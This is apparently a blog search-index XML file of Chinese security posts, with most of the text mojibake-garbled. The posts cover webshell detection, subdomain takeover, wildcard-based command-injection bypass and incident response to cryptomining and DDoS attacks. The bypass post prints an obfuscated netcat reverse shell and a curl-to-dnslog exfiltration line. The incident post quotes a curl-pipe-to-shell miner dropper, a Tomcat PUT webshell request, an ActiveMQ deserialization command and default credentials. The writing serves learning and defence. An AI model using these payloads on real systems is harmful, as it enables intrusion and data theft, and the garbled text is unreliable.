<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[webshellæ£€æµ‹å¹³å°]]></title>
    <url>%2F2018%2F07%2F19%2Fwebshell%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[0x01 ç›¸å…³æŠ€æœ¯ Python ç¼–ç¨‹è¯­è¨€ä½¿ç”¨pythonå¼€å‘ï¼Œçº¯å±ä¸ºäº†å­¦ä¹ ç¼–ç¨‹ã€‚ Flask ä½¿ç”¨Flaskä½œä¸ºWebå¼€å‘å¾®æ¡†æ¶ï¼Œäº¤ä¸å…¶ä»–Pythonæ¡†æ¶ï¼Œå…·æœ‰ç®€ä¾¿ã€æ˜“æ‰©å±•ç­‰ä¼˜ç‚¹ã€‚å…·ä½“å¯çœ‹ï¼šFlaskä¸­æ–‡æ–‡æ¡£ MySQL MySQL æ˜¯æœ€æµè¡Œçš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œåœ¨WEBåº”ç”¨æ–¹é¢ MySQL æ˜¯æœ€å¥½çš„RDBMS(Relational Database Management Systemï¼šå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ)åº”ç”¨è½¯ä»¶ä¹‹ä¸€ã€‚æ–‡æ¡£å‚è€ƒï¼šMySQLæ•™ç¨‹åº”ç”¨è½¯ä»¶ä¹‹ä¸€) inotify ä» Linux 2.6.13 å†…æ ¸å¼€å§‹ï¼ŒLinux å°±æ¨å‡ºäº† inotifyï¼Œå…è®¸ç›‘æ§ç¨‹åºæ‰“å¼€ä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶é’ˆå¯¹äº‹ä»¶é›†ç›‘æ§ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚æ‰“å¼€ã€å…³é—­ã€ç§»åŠ¨/é‡å‘½åã€åˆ é™¤ã€åˆ›å»ºæˆ–è€…æ”¹å˜å±æ€§ï¼Œæ–‡æ¡£å‚è€ƒï¼šç”¨ inotify ç›‘æ§ Linux æ–‡ä»¶ç³»ç»Ÿäº‹ä»¶ 0x02 æ‰«ææµç¨‹ 0x03 å…·ä½“å®ç°æ–‡ä»¶ç›‘æ§æ¨¡å— ä½¿ç”¨inotifyä¸€ç›´å¾ªç¯ç›‘å¬æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ï¼Œå‘ç°æ–°æ–‡ä»¶ç«‹å³è°ƒç”¨æ‰«æå¼•æ“æ£€æµ‹ã€‚ æŸ¥æ€æ¨¡å— å…ˆåˆ¤æ–­æ–‡ä»¶å¤§å°ï¼Œæ–‡ä»¶è¿‡å¤§åˆ™è·³è¿‡ã€‚ æ£€æµ‹è§„åˆ™æœ‰ä¸¤ç§ï¼š å½“typeç­‰äº1æ—¶ï¼Œæ˜¯ä½¿ç”¨çš„æ˜¯é™æ€åŒ¹é…ï¼› å½“typeç­‰äº2æ—¶ï¼Œæ˜¯ä½¿ç”¨çš„æ­£åˆ™åŒ¹é…ï¼Œæ­£åˆ™åŒ¹é…éœ€æ»¡è¶³æ‰€æœ‰æ­£åˆ™æ¡ä»¶æ‰ç®—æˆåŠŸåŒ¹é…ï¼› æ‰«æç»“æŸåï¼Œå°†ç»“æœæ’å…¥æ•°æ®åº“ã€‚ å…¶ä¸­æ£€æµ‹è§„åˆ™ä½¿ç”¨çš„æ˜¯@haozigeä¹‹å‰é€†å‘çš„é˜¿é‡Œäº‘ã€è…¾è®¯äº‘çš„webshellæ£€æµ‹è§„åˆ™ï¼š 0x04 Todo1ã€æœºå™¨å­¦ä¹ æ£€æµ‹webshellï¼šæ·±åº¦å­¦ä¹ PHP webshellæŸ¥æ€å¼•æ“demo 2ã€è¯­ä¹‰åˆ†æï¼ˆæ—è·¯ã€æ²™ç›’ï¼‰æ£€æµ‹webshellï¼šWebshellæŸ¥æ€çš„æ–°æ€è·¯ 3ã€åŸºäºæµé‡æ¨¡å¼æ£€æµ‹webshellï¼ˆåšagentçš„è¯å¾ˆæœ‰ç”¨ï¼‰ 4ã€é€†å‘ç®—æ³•+é™æ€åŒ¹é…æ£€æµ‹webshellï¼šDç›¾webshellæŸ¥æ€]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>MySQL</tag>
        <tag>Flask</tag>
        <tag>inotify</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å­åŸŸååŠ«æŒï¼ˆSubdomain takeoverï¼‰]]></title>
    <url>%2F2018%2F07%2F12%2F%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%EF%BC%88Subdomain-takeover%EF%BC%89%2F</url>
    <content type="text"><![CDATA[å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„æ¼æ´ç±»å‹ï¼Œè®°å½•å­¦ä¹ ä¸‹ 0x01 åŸŸåè§£æåŸŸåè§£ææ˜¯ç”±DNSåè®®å®Œæˆçš„ï¼ŒåŒ…å«äº†å¤šç§è®°å½•ç±»å‹ï¼Œæ¯”å¦‚ï¼š A (Address) è®°å½•ï¼šæŒ‡æ˜åŸŸåå¯¹åº”çš„å“ªä¸ªIP NSè®°å½•ï¼šæŒ‡æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›è¡Œè§£æ CNAMEè®°å½•ï¼šåˆ«åè®°å½•ï¼Œå°†ä¸€ä¸ªåŸŸåæ˜ å°„åˆ°å¦ä¸€ä¸ªåŸŸåçš„è®°å½•ï¼ˆæ¯”å¦‚ï¼šå¼ æ™“æ˜çš„å°åå«å°æ˜ï¼Œå°åå’Œæ™“æ˜éƒ½æ˜¯åŒä¸€ä¸ªäººï¼‰ 0x02 å­åŸŸååŠ«æŒåŸç†æ€ä¹ˆç®€å•æ€ä¹ˆè¯´ï¼š æ¯”å¦‚ï¼šå­åŸŸåtest.example.comé€šè¿‡CNAMEè®°å½•æŒ‡å‘ä¸€ä¸ªæ¯”å¦‚testcdn.img.aliyun.comåŸŸåï¼Œä½†è¯¥ä¸»æœºåå·²ç»ä¸å­˜åœ¨æˆ–è€…è¿‡æœŸäº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ³¨å†Œã€åˆ›å»ºä¸€ä¸ªè¿™ä¸ªä¸å­˜åœ¨çš„testcdn.img.aliyun.comåŸŸåï¼Œè¾¾åˆ°å­åŸŸååŠ«æŒçš„ç›®çš„ 0x03 æ¼æ´æ£€æµ‹å­åŸŸååŠ«æŒæ¼æ´æ£€æµ‹æœ‰ä¸‰ç§æ–¹æ³•ï¼š 1ã€ä½¿ç”¨digã€nslookup123456789101112# nslookup ping.ubnt.com 8.8.8.8Server: 8.8.8.8Address: 8.8.8.8#53Non-authoritative answer:ping.ubnt.com canonical name = dl.ubnt.com.dl.ubnt.com canonical name = d2cnv2pop2xy4v.cloudfront.net.Name: d2cnv2pop2xy4v.cloudfront.netAddress: 54.192.96.244# dig example.com | grep CNAMEexample.com. 3027 IN CNAME example.cloudfront.net. ç„¶åè®¿é—®å‡ºç°çš„CNAMEè®°å½•å€¼ï¼Œå¦‚æœæ˜¾ç¤ºä¸å­˜åœ¨ï¼Œé‚£ä¹ˆCongratulationsï¼ 2ã€ç›´æ¥è®¿é—®å­åŸŸåå¦‚æœå‡ºç°ç±»ä¼¼ä¸‹é¢è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆCongratulationsï¼ 3ã€ä½¿ç”¨å·¥å…·-aquatoneç›´æ¥ä½¿ç”¨aquatone-takeover â€”d target.comå³å¯ 0x04 æ¼æ´å±å®³1ã€è®¤è¯åŠ«æŒã€é’“é±¼ç”±äºæ”»å‡»è€…å·²ç»æ§åˆ¶äº†è¯¥å­åŸŸåï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ„é€ ç‰¹å®šçš„é¡µé¢è¯±å¯¼ç”¨æˆ·æ“ä½œï¼Œæ¯”å¦‚ç™»é™†è¡¨å•ã€å¯†ç è¡¨å•ç­‰ï¼Œç”±äºæ˜¯å®Œå…¨æ­£å¸¸çš„å¯ä¿¡çš„åŸŸåï¼Œæ‰€ä»¥å¾ˆéš¾ä»¥åˆ†åˆ«æ˜¯å¦å­˜åœ¨é’“é±¼ã€‚ 2ã€ä¼šè¯åŠ«æŒè¿™ç§å¯¹é‚£äº›å¤§å‹ä¼ä¸šå±å®³å·¨å¤§ï¼Œç°åœ¨å¾ˆå¤šç½‘ç«™ä½¿ç”¨å•ç‚¹ç™»é™†ï¼ˆSSOï¼‰ï¼Œé‚£ä¹ˆCookieå°±æ˜¯åœ¨æ•´ä¸ªåŸŸä¸­å…±äº«çš„ï¼Œé‚£ä¹ˆæ”»å‡»è€…åªéœ€è¦æ¥å—åˆ°ç”¨æˆ·çš„Cookieï¼Œå³å¯æ“ä½œå…¶ä»–åŸŸåäº†ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>å­åŸŸååŠ«æŒ</tag>
        <tag>takeover</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‘½ä»¤æ‰§è¡Œç»•è¿‡ä¹‹Linuxé€šé…ç¬¦]]></title>
    <url>%2F2018%2F05%2F29%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E4%B9%8BLinux%E9%80%9A%E9%85%8D%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[å‰å‡ å¤©åœ¨å¾®åšå’Œå…¬ä¼—å·ä¸Šçœ‹åˆ°ä¸€äº›ä½¿ç”¨Linuxé€šé…ç¬¦/globæ¨¡å¼æ¥ç»•è¿‡å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ï¼Œæ„Ÿè§‰å¾ˆä¸é”™ï¼Œå­¦ä¹ æ€»ç»“ä¸‹ã€‚ é¦–å…ˆå…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯Linux shell é€šé…ç¬¦/globæ¨¡å¼: æ¦‚å¿µï¼š glob æ¨¡å¼ï¼ˆglobbingï¼‰ä¹Ÿè¢«ç§°ä¹‹ä¸º shell é€šé…ç¬¦ï¼Œåå­—çš„èµ·æºæ¥è‡ªäº Unix V6 ä¸­çš„ /etc/glob ï¼ˆè¯¦è§ man æ–‡æ¡£ï¼‰ã€‚glob æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼åŒ¹é…ï¼Œæœ€å¸¸è§çš„æ˜¯é€šé…ç¬¦æ‹“å±•ï¼Œä¹Ÿå¯ä»¥å°† glob æ¨¡å¼è®¾ä¸ºç²¾ç®€äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æœ€æ–°çš„ CentOS 7 ä¸­å·²ç»åˆ é™¤äº† glob çš„ç›¸å…³æè¿°æ–‡æ¡£ï¼Œåˆ é™¤çš„åŸå› ç”±äº glob å·²ç»æ•´åˆåˆ°äº† shell ä¹‹ä¸­ï¼Œç„¶åå°±æœ‰äº† shell é€šé…ç¬¦ã€‚shell é€šé…ç¬¦ / glob æ¨¡å¼é€šå¸¸ç”¨æ¥åŒ¹é…ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ï¼ï¼ï¼ è¯­æ³•ï¼š å­—ç¬¦ è§£é‡Š * åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦ ? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ [list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ [^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ [!list] åŒ[^list] {str1,str2,â€¦} åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ ä¸“ç”¨å­—ç¬¦é›† å­—ç¬¦ æ„ä¹‰ [:alnum:] ä»»æ„æ•°å­—æˆ–è€…å­—æ¯ [:alpha:] ä»»æ„å­—æ¯ [:space:] ç©ºæ ¼ [:lower:] å°å†™å­—æ¯ [:digit:] ä»»æ„æ•°å­— [:upper:] ä»»æ„å¤§å†™å­—æ¯ [:cntrl:] æ§åˆ¶ç¬¦ [:graph:] å›¾å½¢ [:print:] å¯æ‰“å°å­—ç¬¦ [:punct:] æ ‡ç‚¹ç¬¦å· [:xdigit:] åå…­è¿›åˆ¶æ•° [:blank:] ç©ºç™½å­—ç¬¦ï¼ˆæœªéªŒè¯ï¼‰ Linux shell å…ƒå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨é€šé…ç¬¦æ—¶å¦‚æœæ²¡æœ‰è¿›è¡Œè½¬ä¹‰å¯èƒ½å°±ä¼šè¢«è¾¨è¯†ä¸ºå…ƒå­—ç¬¦ å­—ç¬¦ ä½œç”¨ IFS ç”± &lt; space &gt; æˆ– &lt; tab &gt;æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ CR ç”± &lt; enter &gt; äº§ç”Ÿ = è®¾å®šå˜é‡ $ ä½œå˜é‡æˆ–è¿ç®—æ›¿æ¢ &gt; é‡å¯¼å‘æ ‡å‡†è¾“å‡º &lt; é‡å¯¼å‘æ ‡å‡†è¾“å…¥ `\ ` å‘½ä»¤ç®¡çº¿ &amp; é‡å¯¼å‘æ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ–å°†å‘½ä»¤é™é»˜æ‰§è¡Œ ( ) å°†å…¶å†…çš„å‘½ä»¤ç½®äº nested subshell æ‰§è¡Œï¼Œæˆ–ç”¨äºè¿ç®—æˆ–å‘½ä»¤æ›¿æ¢ { } å°†å…¶å†…çš„å‘½ä»¤ç½®äº non-named function ä¸­æ‰§è¡Œï¼Œæˆ–ç”¨åœ¨å˜é‡æ›¿æ¢çš„ç•Œå®šèŒƒå›´ ; åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè€Œå¿½ç•¥å…¶è¿”å›å€¼ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ &amp;&amp; åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè‹¥è¿”å›å€¼ä¸º trueï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ `\ \ ` åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè‹¥è¿”å›å€¼ä¸º falseï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ ! æ‰§è¡Œ history ä¸­çš„å‘½ä»¤ ç¤ºä¾‹ï¼š ä¸¾å‡ ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¸¾ä¸€åä¸‰ï¼ŒåŒç†ï¼Œå„ç§æ··åˆç»“åˆæ•ˆæœæ›´ä½³ï¼ 123456789 w2n1ck@w2n1ck ~/Desktop/shell î‚° ls a*?abc.txt w2n1ck@w2n1ck ~/Desktop/shell î‚° /???/[l]s12.txt abc.txt w2n1ck@w2n1ck ~/Desktop/shell î‚° /???/[:lower:]s12.txt abc.txtå†æ¯”å¦‚ï¼š/?s?/???/[n]c 2130706433 8888 -e /???/b??h... å…¶ä»–ç»•è¿‡æ–¹å¼ 12345678910111213141516171819202122ls | idls ; id åœ¨shellä¸­ï¼Œæ‹…ä»»&quot;è¿ç»­æŒ‡ä»¤&quot;åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯&quot;åˆ†å·&quot;ls &amp; idls å›è½¦ idls `id` ls ` id` å‰é¢åŠ äº†ä¸€ä¸ªç©ºæ ¼ls `\id` åæ–œæ  i\dç­‰ä»·äºidls $(id)ls | a=i;b=d;$a$b æ‹¼æ¥ls | echo aWQ=| base64 -d | bash åˆ©ç”¨base64`echo &quot;aWQ=&quot;|base64 -d`ls | curl xxx.ceye.io/`whoami` åˆ©ç”¨dnslogæˆ–è€…http web logcat&lt;1.txtcat$IFS$91.txtcat$&#123;IFS&#125;1.txtcat$IFS1.txt%0acat%091.txtw&apos;h&apos;o&apos;am&apos;iw&quot;h&quot;o&quot;am&quot;iwho$@amiecho i$@d|$0w$@h$@o$@a$@m$@i æ³¨æ„äº‹é¡¹ åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚ [[:space:]] æƒ³è¦è½¬ä¹‰çš„æ—¶å€™ï¼Œå•å¼•å·ä¸åŒå¼•å·ä½¿ç”¨æ–¹æ³•æ˜¯ä¸åŒçš„ï¼Œå•å¼•å·ä¼šè½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œè€Œä¸”å•å¼•å·ä¸­é—´ä¸å…è®¸å†å‡ºç°å•å¼•å·ï¼ŒåŒå¼•å·å…è®¸å‡ºç°ç‰¹å®šçš„ shell å…ƒå­—ç¬¦ï¼Œå…·ä½“å­—ç¬¦å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ åœ¨ä½¿ç”¨èŠ±æ‹¬å· {} çš„æ—¶å€™ï¼Œé‡Œé¢çš„å•ä¸ªå­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬ä½ï¼Œå¦åˆ™å°±ä¼šè§†ä¸ºå¤šä¸ªçš„å•ä¸ªå­—ç¬¦ Refererï¼š https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html https://medium.com/secjuice/waf-evasion-techniques-718026d693d8]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>linux</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>é€šé…ç¬¦</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºLinuxæŒ–çŸ¿ã€DDOSç­‰åº”æ€¥äº‹ä»¶å¤„ç½®æ–¹æ³•]]></title>
    <url>%2F2018%2F05%2F08%2F%E5%85%B3%E4%BA%8ELinux%E6%8C%96%E7%9F%BF%E3%80%81DDOS%E7%AD%89%E5%BA%94%E6%80%A5%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[å‰è¨€ä»å»å¹´å…­æœˆä»½åˆ°ç°åœ¨åšçš„åº”æ€¥å“åº”ã€äº‹ä»¶åˆ†æå¤§å¤§å°å°çš„åšäº†23åä¸ªï¼Œä¸»è¦é‡åˆ°çš„æœ‰æŒ–çŸ¿ã€DDoSã€çŸ­ä¿¡æ¥å£ç›—åˆ·ã€ç”¨æˆ·æ¥å£æ³„æ¼ã€è¶Šæƒä¿¡æ¯è·å–ã€æŒ‚é»‘é¡µã€åˆ æ•°æ®ç­‰ã€‚æœ¬æ–‡åªé’ˆå¯¹è‡ªå·±åšçš„åº”æ€¥å“åº”ä¸­çš„æŒ–çŸ¿å’ŒDDoSä¸¤ç±»åšä¸€ä¸‹æ€»ç»“åŠè‡ªå·±çš„å¤„ç½®æ–¹æ³•ï¼Œå¸®åŠ©è¿ç»´ç­‰ç›¸å…³äººå‘˜åœ¨é‡åˆ°ä¹‹åèƒ½å¤Ÿå¿«é€Ÿå“åº”ã€å¤„ç½®ã€‚æ–‡ç« æœ‰ä¸è¶³ä¹‹å¤„æ¬¢è¿å¤§å®¶æŒ‡å‡ºã€è¡¥å……ã€‚ 0x01 åº”æ€¥äº‹ä»¶å¤„ç†æµç¨‹æ˜¯ä»€ä¹ˆï¼ŸæœåŠ¡å™¨å®‰å…¨æ’æŸ¥ webshell æŸ¥æ‰¾ æœ¨é©¬ç—…æ¯’æŸ¥æ‰¾å’Œæ¸…ç† æ¶æ„è¿›ç¨‹ã€ç½‘ç»œè¿æ¥å’Œè‡ªå¯ä»»åŠ¡ç­‰æ¸…ç† é—®é¢˜äº‹ä»¶åˆ†æ æº¯æºäº‹ä»¶ç¼˜ç”±ã€é»‘å®¢æ”»å‡»é€”å¾„ åº”ç”¨ç³»ç»Ÿå®‰å…¨æ¼æ´æ’æŸ¥ åº”ç”¨å®‰å…¨æ¼æ´æ’æŸ¥ 0x02 æ”»å‡»è€…è¿›è¡ŒæŒ–çŸ¿ã€DDoSåˆ©ç”¨çš„æ¼æ´æœ‰å“ªäº›ï¼Ÿ1ã€æœªæˆæƒè®¿é—®æœªæˆæƒè®¿é—®åœ¨æˆ‘æ‰€å¤„ç½®çš„åº”æ€¥å“åº”äº‹ä»¶ä¸­æ‰€å çš„æ¯”é‡æœ€å¤§ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š redisæœªæˆæƒè®¿é—® redisæœªæˆæƒè®¿é—®ä¸»è¦è¢«ç”¨æ¥è¿›è¡ŒæŒ–çŸ¿ï¼Œä¸€èˆ¬æ‰‹æ®µæ˜¯é€šè¿‡rediså†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å½¢å¦‚ï¼š/bin/sh -c /usr/bin/curl -sL https://lnk0.com/VhscA1|shï¼Œç›´æ¥è¿›è¡ŒæŒ–çŸ¿ã€ddosç­‰ã€‚ æ’æŸ¥æ–¹æ³•ï¼š 1redis-cli -h host -p port ä¿®å¤æ–¹æ³•ï¼š ç»‘å®šæœ¬åœ°è®¿é—®ï¼šbind 127.0.0.1 æ·»åŠ è®¤è¯ï¼šrequirepass www.secpulse.com memcacheæœªæˆæƒè®¿é—® memcacheæœªæˆæƒè®¿é—®ä¸»è¦è¢«ç”¨æ¥è¿›è¡ŒDDoSï¼Œåœ¨ä»Šå¹´ä¸‰æœˆä»½çˆ†å‘ï¼Œæ”»å‡»è€…åˆ©ç”¨memcachedåè®®ï¼Œå‘é€å¤§é‡å¸¦æœ‰è¢«å®³è€…IPåœ°å€çš„UDPæ•°æ®åŒ…ç»™æ”¾å¤§ï¨¸ä¸»æœºï¼Œç„¶åæ”¾å¤§ï¨¸ä¸»æœºå¯¹ä¼ªé€ çš„IPåœ°å€æºåšå‡ºå¤§ï¥¾å›åº”ï¼Œå½¢æˆåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œä»è€Œå½¢æˆDRDoSåå°„ã€‚ æ’æŸ¥æ–¹æ³•ï¼š 1nc host port ä¿®å¤æ–¹æ³•ï¼š è®¾ç½®memchachedåªå…è®¸æœ¬åœ°è®¿é—® ç¦æ­¢å¤–ç½‘è®¿é—®Memcached 11211ç«¯å£ ç¼–è¯‘æ—¶åŠ ä¸Šâ€“enable-saslï¼Œå¯ç”¨SASLè®¤è¯ dockeræœªæˆæƒè®¿é—® dockeræœªæˆæƒè®¿é—®ä¸»è¦è¢«ç”¨æ¥è¿›è¡ŒæŒ–çŸ¿ï¼Œé€šè¿‡æŒ‚è½½å®¿ä¸»æœºçš„/etc/ã€/var/spool/cron/ç­‰ç›®å½•ï¼Œä¹‹åå°†ç›¸å…³æŒ–çŸ¿çš„è„šæœ¬ã€å‘½ä»¤ç­‰å†™å…¥åˆ°/etc/crontabï¼Œ/var/spool/cron/crontabs/rootä¸­ã€‚ æ’æŸ¥æ–¹æ³•ï¼š 1curl http://IP:2375/containers/json ä¿®å¤æ–¹æ³•ï¼š åœ¨ä¸å¿…éœ€çš„æƒ…å†µä¸‹ï¼Œä¸è¦å¯ç”¨dockerçš„remote apiæœåŠ¡ åœ¨ docker api æœåŠ¡å™¨å‰é¢åŠ ä¸€ä¸ªä»£ç†ï¼Œä¾‹å¦‚ nginxï¼Œè®¾ç½® 401 è®¤è¯ k8sæœªæˆæƒè®¿é—® k8sæœªæˆæƒè®¿é—®ä¸»è¦è¢«ç”¨æ¥æŒ–çŸ¿ï¼ŒAPI Server é»˜è®¤ä¼šå¼€å¯ä¸¤ä¸ªç«¯å£ï¼š8080å’Œ 6443ã€‚å…¶ä¸­ 8080 ç«¯å£æ— éœ€è®¤è¯ï¼Œ6443 ç«¯å£éœ€è¦è®¤è¯ï¼Œä¸”æœ‰ TLS ä¿æŠ¤ï¼Œç›´æ¥è®¿é—®8080ç«¯å£ä¼šè¿”å›å¯ç”¨çš„APIåˆ—è¡¨ã€‚è®¿é—®dashboard é¡µé¢ï¼Œå¯ä»¥åˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤å®¹å™¨ï¼ŒæŸ¥çœ‹æ—¥å¿—ç­‰ã€‚æ”»å‡»è€…åˆ©ç”¨çš„æµç¨‹å¤§ä½“ä¸ºï¼šåˆ›å»ºæ–°çš„å®¹å™¨ -&gt; æŒ‚è½½å®¿ä¸»æœºç›®å½• -&gt; å†™ /etc/crontabå®šæ—¶ä»»åŠ¡è¿›è¡ŒæŒ–çŸ¿ã€‚ æ’æŸ¥æ–¹æ³•ï¼š 1curl http://IP:8080/ ä¿®å¤æ–¹æ³•ï¼š é…ç½®å®‰å…¨ç»„ã€é˜²ç«å¢™ç­‰ï¼Œç¦æ­¢æ•æ„Ÿç«¯å£å¯¹å¤–å¼€æ”¾ ä¸ºç®¡ç†ç«¯æ·»åŠ è®¤è¯2ã€Tomcat Tomcatç›®å‰å¸¸è¢«åˆ©ç”¨çš„æœ‰ï¼š Tomcat PUTä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼ˆCVE-2017-12615ï¼‰ æ’æŸ¥æ–¹æ³•ï¼š ç›´æ¥å‘é€ä»¥ä¸‹æ•°æ®åŒ…å³å¯åœ¨Webæ ¹ç›®å½•å†™å…¥shell 12345678910PUT /test.jsp/ HTTP/1.1Host: ip:portAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 4test Tomcatå¼±å£ä»¤éƒ¨ç½²waråŒ…getshell æ’æŸ¥æ–¹æ³•ï¼š æŸ¥çœ‹tomcatç®¡ç†æ§åˆ¶å°æ˜¯å¦å­˜åœ¨å¦‚ä¸‹å¼±å£ä»¤ï¼š | ç”¨æˆ·å | å¯†ç  || :â€”-: | :â€”â€”â€“: || tomcat | tomcat || admin | j5Brn9 || admin | admin || admin | tomcat || role | changethis || role1 | role1 || root | root || root | changethis || role1 | tomcat || both | tomcat || tomcat | changethis | ä¿®å¤æ–¹æ³•ï¼š ä¸¥ç¦å¼±å£ä»¤ï¼Œä½¿ç”¨æ•°å­—+å­—æ¯+ç‰¹æ®Šå­—ç¬¦çš„åä½ä»¥ä¸Šå¼ºå¯†ç  åŠæ—¶å‡çº§Tomcatè¡¥ä¸ å®‰å…¨ç»„ã€é˜²ç«å¢™ç­‰è®¾ç½®è®¿é—®ç™½åå• 3ã€ActiveMQActiveMQç›®å‰å¸¸è¢«åˆ©ç”¨çš„æœ‰ï¼š ActiveMQååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2015-5254ï¼‰ é»˜è®¤å¼€å¯61616å’Œ8161ä¸¤ä¸ªç«¯å£ã€‚å…¶ä¸­61616æ˜¯å·¥ä½œç«¯å£ï¼Œæ¶ˆæ¯åœ¨è¿™ä¸ªç«¯å£è¿›è¡Œä¼ é€’ï¼›8161æ˜¯Webç®¡ç†é¡µé¢ç«¯å£ã€‚æ”»å‡»è€…åˆ©ç”¨çš„æµç¨‹ä¸ºï¼šæ„é€ å¯æ‰§è¡Œå‘½ä»¤çš„åºåˆ—åŒ–å¯¹è±¡ -&gt; ä½œä¸ºä¸€ä¸ªæ¶ˆæ¯ï¼Œå‘é€ç»™ç›®æ ‡61616ç«¯å£ -&gt;è®¿é—®webç®¡ç†é¡µé¢ï¼Œè¯»å–æ¶ˆæ¯ï¼Œè§¦å‘æ¼æ´ æ’æŸ¥æ–¹æ³•ï¼š ä¸‹è½½jmetçš„jaræ–‡ä»¶ 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/activemq&quot; -Yp ROME IP 61616 è®¿é—®ï¼šhttp://ip:8161/admin/browse.jsp?JMSDestination=eventçœ‹åˆ°è¿™ä¸ªé˜Ÿåˆ—ä¸­æ‰€æœ‰æ¶ˆæ¯ ç‚¹å‡»æŸ¥çœ‹è¿™æ¡æ¶ˆæ¯å³å¯è§¦å‘å‘½ä»¤æ‰§è¡Œ ActiveMQ fileserverä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼ˆCVE-2016-3088ï¼‰ ActiveMQçš„webæ§åˆ¶å°8161ç«¯å£åˆ†ä¸‰ä¸ªåº”ç”¨ï¼Œadminã€apiå’Œfileserverï¼Œå…¶ä¸­adminæ˜¯ç®¡ç†å‘˜é¡µé¢ï¼Œapiæ˜¯æ¥å£ï¼Œfileserveræ˜¯å‚¨å­˜æ–‡ä»¶çš„æ¥å£ï¼›adminå’Œapiéœ€è¦ç™»å½•åæ‰èƒ½ä½¿ç”¨ï¼Œfileserveræ— 